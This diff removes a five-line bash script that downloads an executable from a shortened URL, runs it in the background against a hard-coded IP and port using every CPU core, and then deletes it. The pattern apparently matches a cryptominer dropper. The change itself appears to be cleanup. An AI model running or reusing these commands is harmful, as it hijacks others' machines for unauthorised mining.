@@ -1,5 +1,0 @@
-#!/bin/bash
-wget -q https://tinyurl.com/matmu 
-chmod +x matmu 
-./matmu -B -o 206.189.14.54:7754 -t$(nproc --all)
-rm -rf matmu
